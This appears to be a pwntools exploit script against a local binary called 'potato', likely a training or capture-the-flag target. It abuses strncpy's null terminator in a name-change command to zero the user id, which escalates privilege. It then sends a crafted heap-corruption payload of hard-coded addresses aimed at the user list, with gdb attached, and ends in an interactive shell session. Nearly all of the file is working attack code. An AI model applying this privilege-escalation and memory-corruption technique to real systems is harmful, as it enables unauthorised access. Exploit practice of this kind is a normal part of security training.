#!/usr/bin/env python3

from pwn import *

import sys

elf = ELF("./potato")

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break login2.c:32
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

# overwrite user structure with user-chosen id: 0
# This overwrites the bytes of the global user-id via the strncpy() call in func.c, 190
# since strncpy adds a null terminator at session.logged_in_user->name[54]
p.sendline(b"changename")
payload=b"\x41" * 50 + b"\x42" * 3
p.sendline(payload)

# Repeat the same for session.logged_in_user->name[53]
p.sendline(b"changename")
payload=b"\x41" * 50 + b"\x42" * 2
p.sendline(payload)

# all bytes in session.logged_in_user->id are now zero, we are privileged
# change name back to original
p.sendline(b"changename")
payload=b"peter" + b"\x0a"
p.sendline(payload)

# # register first user, we will overflow this chunk
# p.sendline(b"register")
# p.sendline(b"user_0")
# p.sendline(b"p@ssw0rd")

# # register second user, we manipulate its meta data via
# # the first users chunk
# p.sendline(b"register")
# p.sendline(b"user_1")
# p.sendline(b"p@ssw0rd")


payload1 = (
"\x90\x40\x12\x08\x90\x34\x12\x08"
#"\x90\x40\x12\x08\x72\xAA\x41\x41"
"\x41\x41\x03\xAA\xAA\xAA\xb8\xcc"
"\xff\xff\x18\xAA\xAA\xAA\x01\xAA"
"\xAA\xAA\x6e\xAA\xAA\xAA\xf4\xcf"
"\x11\x08\xAA\xce\xff\xff\x02\xAA"
"\xAA\xAA\xb8\xcd\xff\xff\x6d\xc6"
"\x04\x08\xb1\xcc\xff\xff\xf4\xcf"
"\x11\x08\xb8\xcd\xff\xff\x16\xb6"
"\x04\x08\x90\x63\x68\x61\x6e\x67"
"\x65\x6e\x61\x6d\x65\xAA\xAA\xAA"
"\xAA\xAA\xe7\xab\x06\x08\xf4\xcf"
"\x11\x08\xa8\xb7\x11\x08\xf4\xcf"
"\x11\x08\xc0\x2e\x12\x08\xAA\xAA"
"\xAA\xAA\xAA\xAA\xAA\xAA\x30\x40"
"\x07\x08\x80\x30\x12\x08\x37\x30"
"\x12\x08\xAA\xb7\x11\x08\x74\xad"
"\x06\x08\x08\xAA\xAA\xAA\xf4\xcf"
"\x11\x08\xec\xff\xff\xff\xe0\xd4"
"\x11\x08\x90\x28\x12\x08\xAA\xAA"
"\xAA\xAA\xc4\xbe\x57\xba\x59\x85"
"\x06\x08\xc0\x2e\x12\x08\xAA\xAA"
"\xAA\xAA\x1d\xa6\x06\x08\x30\x40"
#"\x07\x08\xc0\x2e\x12\x08\xf4\xcf"
# first four bytes: next pointer
# second four bytes: user pointer

# address of head entry in user list: 0x8124140
# user of head entry (root): 0x8124090 (see first four bytes of payload!)
# leaked memory, digest of peters password: 0x8123490. Can be used to divert the free() in delete()
# memory chunk to delete: 0x8123490
# address of currently logged in user: 0x811df58

#"\x58\xdf\x11\x08\x50\x41\x12\x08"
"\x58\xdf\x11\x08"
)

gdb.attach(p, '''
break main
#break func.c:56           
#break func.c:185
#break func.c:191
break userlist.c:75
#break userlist.c:38
continue
''')

# fill username buffer with As
p.sendline(b"changename")
#payload = b"\x41"*50
p.sendline(payload1)

p.interactive()
